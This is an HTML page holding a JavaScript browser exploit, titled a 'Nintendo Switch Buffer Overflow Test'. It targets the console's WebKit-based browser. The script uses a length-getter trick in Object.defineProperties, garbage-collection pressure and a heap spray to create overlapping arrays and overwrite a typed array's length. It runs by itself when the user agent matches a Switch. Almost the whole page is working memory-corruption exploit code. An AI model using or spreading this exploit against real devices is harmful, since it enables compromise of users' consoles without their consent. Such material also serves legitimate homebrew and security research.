<!doctype html>
<html>
    <head>
        <title>Switch Buffer Overflow test</title>
        <style>
            body {font-size: 2em;}
            a {text-decoration: none; color: #000;}
            a:hover {color: #f00; font-weight: bold;}
        </style>
    </head>
    <body>
        <h1>Nintendo Switch Buffer Overflow Test</h1>
        <ul>
            <li><a href='javascript:go();'>go!</a></li>
            <li><a href='javascript:document.location.reload();'>reload</a></li>
        </ul>
        <div id='status'>waiting... click go.</div>

            <script>
                window.onerror = function(error, url, line) {
                    alert(error+' URL:'+url+' L:'+line);
                };
            </script>
            <script>
                var pressure = new Array(100);
                dgc = function() {
                    for (var i = 0; i < pressure.length; i++) {
                        pressure[i] = new Uint32Array(0x1337);
                    }
                    for (var i = 0; i < pressure.length; i++) {
                        pressure[i] = 0;
                    }
                }
                var bufs = new Array(0x2000);
                var smash = new Uint32Array(0x13);
                var stale = 0;
                var _dview = null;              
                function u2d(low, hi) {
                    if (!_dview) _dview = new DataView(new ArrayBuffer(32));
                    _dview.setUint32(0, hi);
                    _dview.setUint32(4, low);
                    return _dview.getFloat64(0);
                }
                function go_() {
                    
                    if (smash.length != 0x20) return;
                   
                    dgc();
                   
                    var arr = new Array(0x1000);

                    var yolo = new ArrayBuffer(0x10000);
                   
                    arr[0] = yolo;
                    arr[1] = 0x13371337;
                    
                    var not_number = {};
                    not_number.toString = function() {
                        arr = null;
                        props["stale"]["value"] = null;
                        
                        if (bufs[0]) return 10;
                        
                        for (var i = 0; i < 20; i++) {
                            dgc();
                        }
                        
                        for (i = 0; i < bufs.length; i++) {
                            
                            bufs[i] = new Uint32Array(0x100 * 2)
                           
                            for (k = 0; k < bufs[i].length;) {
                                
                                bufs[i][k++] = 0x41414141;
                                bufs[i][k++] = 0xffffff00;
                            }
                        }
                        return 10;
                    };
                    
                    var props = {
                        p0: { value: 0 },
                        p1: { value: 1 },
                        p2: { value: 2 },
                        p3: { value: 3 },
                        p4: { value: 4 },
                        p5: { value: 5 },
                        p6: { value: 6 },
                        p7: { value: 7 },
                        p8: { value: 8 },
                        
                        length: { value: not_number },

                        stale: { value: arr },
                        after: { value: 666 }
                    };
                    
                    var target = [];
                    
                    Object.defineProperties(target, props);
                    
                    stale = target.stale;
                   
                    if(stale[0]==0x41414141) {
                        
                        stale[0] += 0x101;
                        
                        for (i = 0; i < bufs.length; i++) {
                            for (k = 0; k < bufs[0].length; k++) {
                                
                                if (bufs[i][k] == 0x41414242) {
                                    alert('Overlapping Arrays found at bufs['+i+']['+k+']\nsmash.length is still: 0x'+smash.length.toString(16));
                                    
                                    stale[0] = {
                                        'a': u2d(105, 0), 
                                        'b': u2d(0, 0),
                                        'c': smash, 
                                        'd': u2d(0x100, 0)
                                    }
                                    alert('created the JSObject.\nstale[0] = '+stale[0]);
                                    
                                    stale[1] = stale[0];
                                    
                                    bufs[i][k] += 0x10;
                                    
                                    alert('misaligned the pointer to the JSObject.\nstale[0] = '+stale[0]+'');
                                    
                                    stale[0][6] = 0x1337;
                                    
                                    alert('smash.length is now: 0x'+smash.length.toString(16));
                                    alert('done!\nswitch will probably crash now :O');
                                    return;
                                }
                            }
                        }
                    }
                    document.getElementById('status').innerText = 'fail. refresh the page and try again...';
                    setTimeout(function() {document.location.reload();}, 1000);
                }
                function go() {
                    document.getElementById('status').innerText = 'go!';
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    setTimeout(go_, 500);
                }
               
                if(navigator.userAgent.indexOf('Nintendo Switch')>-1) {
                    document.getElementById('status').innerText = 'Found Nintendo Switch!';
                    setTimeout(go, 2000);
                }
            </script>
    </body>
</html>
